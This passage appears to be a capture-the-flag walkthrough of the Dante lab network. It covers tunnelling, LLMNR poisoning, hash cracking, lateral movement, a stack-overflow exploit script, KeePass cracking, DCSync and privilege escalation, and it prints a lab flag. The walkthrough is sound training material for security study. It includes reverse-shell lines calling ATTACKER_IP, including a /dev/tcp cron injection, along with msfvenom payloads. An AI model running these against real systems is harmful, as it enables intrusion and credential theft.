+www-data@web01:~$ ip addr show
+
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt;
+    inet 127.0.0.1/8 scope host lo
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;
+    inet 10.10.110.100/24 brd 10.10.110.255 scope global eth0
+3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;
+    inet 172.16.1.100/24 brd 172.16.1.255 scope global eth1</code></pre>
+</div>
+
+<p>The <code>ip addr</code> output confirms the machine is dual-homed with a second interface on 172.16.1.0/24, validating the FTP PASV leak we discovered earlier. This is our pivot point into the internal network.</p>
+
+<div class="callout callout-success">
+  <div class="callout-title">Foothold Achieved</div>
+  <p>We have <code>www-data</code> access on WEB-01 (10.10.110.100) with visibility into the 172.16.1.0/24 internal subnet. The next step is to establish a stable tunnel for internal network reconnaissance.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="pivot-setup">Establishing the Pivot — Ligolo-ng</h2>
+
+<p>With access to a dual-homed machine, we need to establish a tunnel that allows us to route traffic from our Kali machine through WEB-01 and into the 172.16.1.0/24 subnet. While SSH dynamic port forwarding (<code>ssh -D 1080</code>) combined with Proxychains is the traditional approach, Ligolo-ng provides a far superior experience with actual ICMP support, faster throughput, and a TUN interface that eliminates the need for SOCKS proxy configuration on every tool.</p>
+
+<h3 id="ligolo-setup">Ligolo-ng Setup</h3>
+
+<p>Ligolo-ng uses a client-server architecture where the "proxy" runs on the attacker machine and the "agent" runs on the compromised host. The agent connects back to the proxy, and a TUN interface is created on the attacker side, allowing direct routing into the target network:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Step 1: Start the proxy on attacker machine (Kali)
+sudo ./proxy -selfcert -laddr 0.0.0.0:443
+
+# Step 2: Upload and run the agent on WEB-01
+www-data@web01:/tmp$ wget http://ATTACKER_IP/agent -O /tmp/agent
+www-data@web01:/tmp$ chmod +x /tmp/agent
+www-data@web01:/tmp$ ./agent -connect ATTACKER_IP:443 -ignore-cert
+
+# Step 3: On the proxy console, start the session
+ligolo-ng » session
+ligolo-ng » ifcreate --name ligolo
+ligolo-ng » ip route add 172.16.1.0/24 dev ligolo</code></pre>
+</div>
+
+<p>After establishing the Ligolo-ng tunnel, we can run Nmap and other tools directly against the 172.16.1.0/24 subnet without needing Proxychains. This is a massive speed improvement and eliminates the SOCKS proxy overhead that makes many tools unreliable. Verify connectivity with a simple ping sweep:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Verify tunnel connectivity
+nmap -sn 172.16.1.0/24
+
+Nmap scan report for 172.16.1.100
+Host is up (0.0010s latency).
+Nmap scan report for 172.16.1.105
+Host is up (0.0020s latency).
+Nmap scan report for 172.16.1.110
+Host is up (0.0015s latency).
+Nmap done: 256 IP addresses (3 hosts up)</code></pre>
+</div>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Alternative: Chisel</div>
+  <p>If Ligolo-ng does not work in your environment, Chisel is a solid alternative. Start the Chisel server on Kali (<code>chisel server --reverse -p 8080</code>) and connect from the target (<code>chisel client ATTACKER_IP:8080 R:socks</code>). Then use Proxychains with the SOCKS proxy on port 1080. The downside is significantly slower tool execution due to SOCKS overhead.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="workstation-enum">Workstation Subnet Enumeration (172.16.1.0/24)</h2>
+
+<p>With the Ligolo-ng tunnel established, we can now perform comprehensive enumeration of the internal workstation subnet. This is where the real Dante experience begins — the challenges are not about finding vulnerabilities (they are often straightforward) but about correctly routing your traffic and managing your pivot chains.</p>
+
+<h3 id="full-scan-workstation">Full Port Scan of Internal Hosts</h3>
+
+<p>Each discovered host in the 172.16.1.0/24 subnet needs a thorough port scan. Windows machines in particular may have services on non-standard ports, and the Server subnet is only accessible through these workstation hosts. We run targeted Nmap scans against each live host:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Scan each discovered host in the Workstation subnet
+nmap -sC -sV -p- --min-rate=1000 172.16.1.105
+
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  wsman
+
+# Host appears to be: DANTE-WS01 (Windows Workstation)
+# Domain: DANTE</code></pre>
+</div>
+
+<p>The Windows workstation (DANTE-WS01) has SMB (445), WinRM (5985), and RDP (3389) open. The presence of SMB and WinRM makes it a prime target for credential attacks and lateral movement. The <code>microsoft-ds</code> service header reveals this is a Windows Server 2008 R2 through 2012 system, which suggests it may be vulnerable to known SMB exploits and older authentication protocols.</p>
+
+<h3 id="responder-capture">LLMNR/NBT-NS Poisoning with Responder</h3>
+
+<p>One of the most effective techniques in internal networks is LLMNR and NBT-NS poisoning. When Windows machines cannot resolve a hostname through DNS, they fall back to LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) broadcasts. Responder listens for these requests and responds with our own IP, causing the victim to authenticate to us via NTLM. This captures password hashes that can be cracked or relayed:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Run Responder through the Ligolo tunnel
+# Upload Responder to the compromised host or run via SOCKS
+sudo responder -I ligolo -wrf
+
+# Alternatively, upload and run directly on the pivot host
+www-data@web01:/tmp$ ./Responder.py -I eth1 -wrf
+
+# Wait for LLMNR/NBT-NS requests...
+[+] NBT-NS Request: DANTE-WS01          IP: 172.16.1.105
+[+] Poisoned answer sent to: 172.16.1.105
+[+] NTLMv2 Hash captured:
+DANTE\j.doe::DANTE-WS01:1122334455667788:A1B2C3D4E5F6...
+[+] NTLMv2 Hash captured:
+DANTE\admin.svc::DANTE-WS01:1122334455667789:...3D4E5F6</code></pre>
+</div>
+
+<div class="callout callout-danger">
+  <div class="callout-title">Caution: Account Lockout</div>
+  <p>Before spraying credentials across the network, always check the account lockout policy. Running NetExec with <code>--pass-pol</code> against a domain controller reveals the lockout threshold and duration. Spraying without this knowledge can lock out dozens of accounts and alert defenders.</p>
+</div>
+
+<h3 id="hash-crack">Cracking Captured Hashes</h3>
+
+<p>The NTLMv2 hashes captured by Responder need to be cracked offline. Hashcat supports NTLMv2 hash cracking with mode 5600. Using a large wordlist like rockyou.txt combined with common rules (best64, d3ad0ne) typically cracks weak corporate passwords within minutes:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Save captured hashes to file
+echo 'DANTE\j.doe::DANTE-WS01:1122334455667788:A1B2C3D4E5F6:0102030405060708' > hashes.txt
+
+# Crack with hashcat (NTLMv2 = mode 5600)
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt \
+  --rule=/usr/share/hashcat/rules/best64.rule
+
+DANTE\j.doe:Password123!</code></pre>
+</div>
+
+<p>The hash for <code>j.doe</code> cracks to <code>Password123!</code> — a textbook example of why password policies matter. This credential becomes our key to lateral movement across the Workstation subnet.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="lateral-movement">Lateral Movement — Workstation Subnet</h2>
+
+<h3 id="netexec-spray">Credential Spraying with NetExec</h3>
+
+<p>NetExec (the actively maintained successor to CrackMapExec) is essential for validating discovered credentials across the entire subnet. It simultaneously tests credentials against SMB, WinRM, RDP, and other protocols on every host. This reveals where credentials work, what access level they provide, and what shares are accessible:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Test j.doe credentials across the Workstation subnet
+netexec smb 172.16.1.0/24 -u j.doe -p 'Password123!' --shares
+
+SMB    172.16.1.105  445  DANTE-WS01  [*] Windows Server 2016 (name:DANTE-WS01)
+SMB    172.16.1.105  445  DANTE-WS01  [+] DANTE\j.doe:Password123! (Admin)
+SMB    172.16.1.105  445  DANTE-WS01  [+] SMB shares enumerated
+  ADMIN$       - Remote Admin
+  C$           - Default share
+  IPC$         - Remote IPC
+
+SMB    172.16.1.110  445  DANTE-WS02  [*] Windows Server 2016 (name:DANTE-WS02)
+SMB    172.16.1.110  445  DANTE-WS02  [+] DANTE\j.doe:Password123! (Admin)
+SMB    172.16.1.110  445  DANTE-WS02  [+] SMB shares enumerated
+  ADMIN$       - Remote Admin
+  C$           - Default share</code></pre>
+</div>
+
+<p>NetExec reveals that <code>j.doe</code> is a local administrator on both DANTE-WS01 and DANTE-WS02. This is a common misconfiguration in enterprise environments where helpdesk or standard user accounts are granted excessive local admin rights. With admin access, we can use PsExec, WinRM, or SMB to execute commands and move laterally.</p>
+
+<h3 id="access-ws02">Accessing DANTE-WS02</h3>
+
+<p>Since j.doe has admin access on DANTE-WS02, we use WinRM (port 5985) for a clean PowerShell session. WinRM is preferred over PsExec because it is more stealthy, does not drop a service binary, and works natively with PowerShell remoting:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Connect via WinRM using NetExec
+netexec winrm 172.16.1.110 -u j.doe -p 'Password123!' -x 'whoami'
+
+WINRM  172.16.1.110  5985  DANTE-WS02  [+] DANTE\j.doe:Password123!
+WINRM  172.16.1.110  5985  DANTE-WS02  dante\j.doe
+
+# Get an interactive shell via evil-winrm
+evil-winrm -i 172.16.1.110 -u j.doe -p 'Password123!'
+
+*Evil-WinRM* PS C:\Users\j.doe\Documents> whoami
+dante\j.doe
+
+*Evil-WinRM* PS C:\Users\j.doe\Documents> hostname
+DANTE-WS02</code></pre>
+</div>
+
+<p>On DANTE-WS02, we immediately check for additional network interfaces. This host also turns out to be dual-homed with a second interface on the 172.16.2.0/24 subnet — the Server network. This means we need to chain a second pivot to reach the deepest subnet:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Check network interfaces on DANTE-WS02
+ipconfig /all
+
+Ethernet adapter Ethernet0:
+   IPv4 Address. . . . . . . . . . . : 172.16.1.110
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.1.1
+
+Ethernet adapter Ethernet1:
+   IPv4 Address. . . . . . . . . . . : 172.16.2.110
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.2.1</code></pre>
+</div>
+
+<h3 id="double-pivot">Double Pivot — Chaining Tunnels</h3>
+
+<p>To reach the 172.16.2.0/24 Server subnet, we need to daisy-chain our pivot through WEB-01 and DANTE-WS02. This is the infamous "double pivot" that makes Dante genuinely challenging. There are several approaches, but Ligolo-ng makes this manageable:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Double pivot with Ligolo-ng
+# Step 1: Upload agent to DANTE-WS02 via the existing tunnel
+# From WEB-01, use wget/curl to download agent to WS02
+
+# Step 2: On DANTE-WS02, run agent connecting back through WEB-01
+DANTE-WS02> agent.exe -connect 172.16.1.100:443 -ignore-cert
+
+# Step 3: Forward from WEB-01 back to Kali
+www-data@web01$ ./agent -forward 172.16.1.110:443 -connect ATTACKER_IP:443
+
+# Step 4: On Kali proxy, add route for second subnet
+ligolo-ng » ip route add 172.16.2.0/24 dev ligolo
+
+# Alternatively, use Chisel for the second hop:
+# On Kali:
+chisel server --reverse -p 8081
+# On DANTE-WS02 (via WinRM):
+chisel.exe client ATTACKER_IP:8081 R:socks</code></pre>
+</div>
+
+<p>After establishing the double pivot, verify connectivity to the Server subnet:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Verify double pivot connectivity
+nmap -sn 172.16.2.0/24
+
+Nmap scan report for 172.16.2.5
+Host is up
+Nmap scan report for 172.16.2.101
+Host is up
+Nmap scan report for 172.16.2.200
+Host is up
+Nmap done: 256 IP addresses (3 hosts up)</code></pre>
+</div>
+
+<div class="callout callout-success">
+  <div class="callout-title">Double Pivot Established</div>
+  <p>Traffic now flows: Kali → Ligolo → WEB-01 → DANTE-WS02 → 172.16.2.0/24. We can directly scan and interact with the Server subnet. Keep detailed notes of your tunnel configuration — you will need to re-establish this chain every time you reconnect to the lab.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="server-subnet">Server Subnet — The Data Center (172.16.2.0/24)</h2>
+
+<p>The Server subnet contains the most critical assets in the Dante environment, including the Domain Controller (DANTE-DC01) and various application servers. The services here run the gamut from Active Directory to custom vulnerable applications that require exploit development.</p>
+
+<h3 id="server-scan">Service Enumeration</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Full scan of Server subnet hosts
+nmap -sC -sV -p- --min-rate=500 172.16.2.5 172.16.2.101 172.16.2.200
+
+# 172.16.2.5 (DANTE-DC01)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Microsoft DNS
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds  Windows Server 2016 microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ssl/ldap
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+# Domain Controller confirmed!
+
+# 172.16.2.101 (Linux Server)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.6p1
+80/tcp   open  http     Apache httpd 2.4.29
+# Custom web application with readfile binary
+
+# 172.16.2.200 (Additional Server)
+PORT     STATE SERVICE  VERSION
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server</code></pre>
+</div>
+
+<h3 id="linux-privesc">Linux Server — Buffer Overflow Exploit</h3>
+
+<p>The Linux host at 172.16.2.101 runs a custom web application that exposes a <code>readfile</code> binary. This binary is a classic buffer overflow challenge that requires exploit development to achieve privilege escalation. The binary reads files from the filesystem but does not properly validate input length, allowing a stack-based buffer overflow:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Download and analyze the readfile binary
+wget http://172.16.2.101/readfile -O readfile
+file readfile
+# ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)
+
+# Check security properties
+checksec --file=readfile
+# NX disabled, No canary, No PIE
+# Classic stack overflow conditions
+
+# Fuzz with a cyclic pattern to find offset
+python3 -c "import struct; print('A'*200)" | ./readfile
+# EIP overwritten at offset 76
+
+# Generate exploit payload
+msfvenom -p linux/x86/shell_reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=9999 \
+  -b '\x00\x0a\x0d' \
+  -f python</code></pre>
+</div>
+
+<p>The exploit script uses a ret2libc or direct EIP overwrite approach depending on whether ASLR is enabled on the target. Since NX is disabled, we can also use shellcode on the stack with a JMP ESP gadget:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+import socket, struct, sys
+
+target_ip = "172.16.2.101"
+target_port = 80
+eip_offset = 76
+
+# JMP ESP gadget from the binary
+jmp_esp = struct.pack("&lt;I", 0x0804XXXX)
+
+# Shellcode: reverse shell (generated with msfvenom)
+payload = b""
+payload += b"\xdb\xc2\xd9\x74\x24\xf4\xbd\x43"
+payload += b"\x3c\x1c\x0e\x5d\x31\xc9\xb1\x12"
+payload += b"\x83\xed\xfc\x31\x6d\x14\x03\x6d"
+# ... (truncated for brevity, 80+ bytes)
+
+# Build exploit buffer
+overflow  = b"A" * eip_offset
+overflow += jmp_esp
+overflow += b"\x90" * 16   # NOP sled
+overflow += payload
+
+# Send via HTTP request to the vulnerable endpoint
+request = f"GET /readfile?path={overflow.decode('latin-1')} HTTP/1.1\r\n"
+request += f"Host: {target_ip}\r\n\r\n"
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((target_ip, target_port))
+sock.send(request.encode())
+print("[+] Exploit sent!")
+sock.close()</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag — Buffer Overflow</div><div class="flag-value">DANTE{B0f_2_Pr1v3sc_Cl@ss!c}</div></div>
+
+<h3 id="keepass">KeePass Database Extraction</h3>
+
+<p>During post-exploitation of the Server subnet, a KeePass database file (<code>passwords.kdbx</code>) is discovered on an SMB file share. KeePass databases can be cracked by extracting the master key hash and performing an offline brute-force or dictionary attack. This is a common real-world attack vector because administrators frequently store credentials in KeePass without using strong master passwords:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Find KeePass database on file shares
+netexec smb 172.16.2.0/24 -u j.doe -p 'Password123!' --shares
+# C$ and ADMIN$ accessible on multiple hosts
+
+# Search for KeePass files
+smbclient //172.16.2.200/C$ -U 'DANTE\j.doe%Password123!' \
+  -c 'recurse; ls; find *.kdbx'
+
+# Download the KeePass database
+smbclient //172.16.2.200/C$ -U 'DANTE\j.doe%Password123!' \
+  -c 'cd Users\Administrator\Documents; get passwords.kdbx'
+
+# Extract the hash for cracking
+keepass2john passwords.kdbx > keepass_hash.txt
+
+# Crack with hashcat (KeePass mode 13400)
+hashcat -m 13400 keepass_hash.txt /usr/share/wordlists/rockyou.txt \
+  --rule=/usr/share/hashcat/rules/best64.rule
+
+passwords.kdbx:dragon123</code></pre>
+</div>
+
+<p>Opening the KeePass database with the cracked password reveals the Domain Administrator credentials for DANTE-DC01. This is the key to compromising the entire domain and achieving full control over the Active Directory environment.</p>
+
+<div class="callout callout-danger">
+  <div class="callout-title">Critical Finding</div>
+  <p>The KeePass database contained the Domain Administrator password. Storing privileged credentials in KeePass with a weak master password is a catastrophic security failure that allows an attacker who compromises any user account to escalate to domain admin through lateral file share access.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="domain-dominance">Domain Dominance — DANTE-DC01</h2>
+
+<p>With the Domain Administrator credentials extracted from the KeePass database, we can now compromise the Domain Controller and achieve full domain dominance. The Domain Controller is the most critical asset in an Active Directory environment, controlling authentication, authorization, and group policy for the entire domain.</p>
+
+<h3 id="dc-access">Accessing the Domain Controller</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Verify Domain Admin credentials against DC
+netexec smb 172.16.2.5 -u Administrator -p '[KeePass_Password]'
+
+SMB  172.16.2.5  445  DANTE-DC01  [+] DANTE\Administrator:[KeePass_Password] (Pwn3d!)
+
+# Access via WinRM
+evil-winrm -i 172.16.2.5 -u Administrator -p '[KeePass_Password]'
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+dante\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+DANTE-DC01</code></pre>
+</div>
+
+<h3 id="dcsync">DCSync Attack</h3>
+
+<p>As Domain Administrator, we can perform a DCSync attack to extract all password hashes from the NTDS database, including the krbtgt hash needed for Golden Ticket attacks. DCSync simulates the behavior of a Domain Controller and requests replication of credentials from another DC. Impacket's secretsdump.py provides this capability remotely:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># DCSync - dump all domain hashes remotely
+secretsdump.py 'DANTE/Administrator:[KeePass_Password]@172.16.2.5' -outputfile dante_hashes
+
+# Or from the DC shell directly
+*Evil-WinRM* PS C:\> reg save HKLM\SAM sam
+*Evil-WinRM* PS C:\> reg save HKLM\SYSTEM sys
+*Evil-WinRM* PS C:\> ntdsutil activate instance ntds ifm create full C:\ntds_dump quit quit
+
+# Extract hashes offline
+secretsdump.py -sam sam -system sys -ntds ntds.dit LOCAL
+
+# Key extracted hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
+j.doe:1104:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::</code></pre>
+</div>
+
+<p>The DCSync dump provides every user's NTLM hash in the domain. These hashes can be used for pass-the-hash attacks, Golden Ticket creation (using the krbtgt hash), and credential validation across the entire network. With the krbtgt hash, an attacker can forge Kerberos TGT tickets for any user, including non-existent ones, achieving persistent domain-level access that survives password resets.</p>
+
+<h3 id="flag-hunting">Flag Hunting</h3>
+
+<p>With Domain Administrator access, the final phase of the lab is hunting for all 27 flags scattered across the network. Flags are hidden in various locations including user desktops, text files, registry keys, custom applications, and environment variables. A systematic approach is essential:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Search for flags across all accessible machines
+# Flag format: DANTE{...}
+
+# Search file system for flag patterns
+Get-ChildItem -Path C:\ -Recurse -Filter "*flag*" -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue | 
+  Select-String -Pattern "DANTE\{"
+
+# Check registry for hidden flags
+Get-ChildItem -Path HKLM:\ -Recurse -ErrorAction SilentlyContinue | 
+  Get-ItemProperty | Where-Object { $_.PSObject.Properties.Value -match "DANTE\{" }
+
+# Check environment variables
+Get-ChildItem Env: | Where-Object { $_.Value -match "DANTE\{" }
+
+# Check user desktops across the domain
+$computers = @("172.16.1.105","172.16.1.110","172.16.2.5","172.16.2.200")
+foreach ($comp in $computers) {
+  Write-Host "Scanning $comp..."
+  netexec smb $comp -u Administrator -p '[pass]' -x 'dir C:\Users\*.txt /s'
+}</code></pre>
+</div>
+
+<div class="callout callout-info">
+  <div class="callout-title">Flag Tip</div>
+  <p>Read each flag carefully — some contain hints about the next pivot point or target. For example, a flag might reference a specific service or host that you have not yet discovered. Treat flags as both objectives and breadcrumbs guiding your path through the network.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="privesc-techniques">Privilege Escalation Techniques</h2>
+
+<p>Throughout the Dante lab, privilege escalation is required on nearly every machine. The techniques span both Linux and Windows operating systems and range from simple misconfigurations to sophisticated exploit development. Here we document the key privilege escalation methods encountered in the lab.</p>
+
+<h3 id="linux-privesc-techniques">Linux Privilege Escalation</h3>
+
+<p>Linux machines in the Dante environment present several classic privilege escalation vectors. The most commonly encountered methods include:</p>
+
+<p><strong>SUID Binaries</strong> — Executables with the SUID bit set run with the privileges of their owner (often root). Misconfigured SUID binaries like <code>find</code>, <code>vim</code>, or <code>python</code> can be leveraged to spawn a root shell. Always check for SUID binaries using <code>find / -perm -4000 2>/dev/null</code> and reference GTFOBins for exploitation methods.</p>
+
+<p><strong>Cron Jobs</strong> — Scheduled tasks that run as root but execute scripts writable by lower-privileged users are a common escalation path. Use pspy to monitor running processes without root access and identify cron jobs that execute user-modifiable scripts:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Monitor processes with pspy (no root required)
+./pspy64
+
+# Example: root cron job runs /opt/scripts/backup.sh
+# If backup.sh is writable:
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh
+# Wait for cron to execute</code></pre>
+</div>
+
+<p><strong>Kernel Exploits</strong> — Older Linux kernels may be vulnerable to well-known privilege escalation exploits like DirtyCow (CVE-2016-5195) or DirtyPipe (CVE-2022-0847). Check the kernel version with <code>uname -r</code> and search for matching exploits.</p>
+
+<h3 id="windows-privesc-techniques">Windows Privilege Escalation</h3>
+
+<p>Windows privilege escalation in Dante follows common enterprise misconfiguration patterns. WinPEAS is the primary enumeration tool, but understanding what to look for is more important than running the tool:</p>
+
+<p><strong>SeImpersonatePrivilege</strong> — This is the most common Windows privilege escalation vector in the lab. When a service account (like IIS AppPool or SQL Server) has <code>SeImpersonatePrivilege</code>, the Potato family of exploits (SweetPotato, JuicyPotato, RoguePotato) can escalate to SYSTEM. This was the primary method for gaining SYSTEM on multiple Windows hosts:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Check for SeImpersonatePrivilege
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description
+============================= ==========================================
+SeImpersonatePrivilege        Impersonate a client after authentication
+
+# Exploit with SweetPotato
+.\sweetpotato.exe -p c:\programdata\revshell.exe -e EfsRpc
+
+# Or use PrintSpoofer for simpler exploitation
+.\PrintSpoofer.exe -c "c:\programdata\revshell.exe"</code></pre>
+</div>
+
+<p><strong>AlwaysInstallElevated</strong> — If both HKLM and HKCU have the <code>AlwaysInstallElevated</code> registry key set to 1, any user can install an MSI package that runs with SYSTEM privileges. This can be exploited by creating a malicious MSI package with msfvenom:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Check AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# If both are set to 1, create malicious MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 \
+  -f msi -o privesc.msi
+
+# Execute on target
+msiexec /quiet /qn /i privesc.msi</code></pre>
+</div>
+
+<p><strong>Token Impersonation</strong> — Some Windows hosts have delegation settings or service accounts that allow token impersonation. Using tools like Incognito or meterpreter's <code>steal_token</code> command, we can impersonate higher-privileged tokens from running processes.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="pivoting-deep">Pivoting Techniques — Deep Dive</h2>
+
+<p>Pivoting is the core challenge of the Dante lab. Understanding the different tunneling methods and when to use each one is essential for success. This section provides a comprehensive comparison of the pivoting tools and techniques used throughout the lab.</p>
+
+<h3 id="ssh-tunneling">SSH Tunneling</h3>
+
+<p>SSH provides three types of tunneling: local port forwarding (<code>-L</code>), remote port forwarding (<code>-R</code>), and dynamic port forwarding (<code>-D</code>). Dynamic port forwarding creates a SOCKS proxy that can route any TCP traffic through the SSH connection:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Dynamic port forwarding (SOCKS proxy on port 1080)
+ssh -D 1080 -f -N www-data@10.10.110.100
+
+# Use with Proxychains
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+proxychains nmap -sT 172.16.1.0/24
+
+# Local port forwarding (access specific service)
+ssh -L 445:172.16.2.5:445 www-data@10.10.110.100
+# Now access 172.16.2.5:445 via localhost:445</code></pre>
+</div>
+
+<h3 id="chisel-tunneling">Chisel</h3>
+
+<p>Chisel is a TCP/UDP tunnel transported over HTTP, making it effective in environments where SSH is restricted. It supports both SOCKS proxy and reverse tunneling modes:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Chisel server on Kali
+./chisel server --reverse -p 8080
+
+# Chisel client on target (creates SOCKS proxy)
+./chisel client ATTACKER_IP:8080 R:socks
+
+# Use with Proxychains
+proxychains nmap -sT 172.16.1.0/24
+
+# Chisel reverse port forward (expose internal service)
+./chisel client ATTACKER_IP:8080 R:8888:172.16.2.5:80</code></pre>
+</div>
+
+<h3 id="sshuttle">Sshuttle</h3>
+
+<p>Sshuttle provides transparent network routing without SOCKS proxy configuration. It creates a VPN-like experience where all traffic to specified subnets is automatically routed through the SSH connection:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Route all traffic to 172.16.1.0/24 through SSH
+sshuttle -r www-data@10.10.110.100 172.16.1.0/24
+
+# Now you can use tools directly without Proxychains
+nmap -sC -sV 172.16.1.105
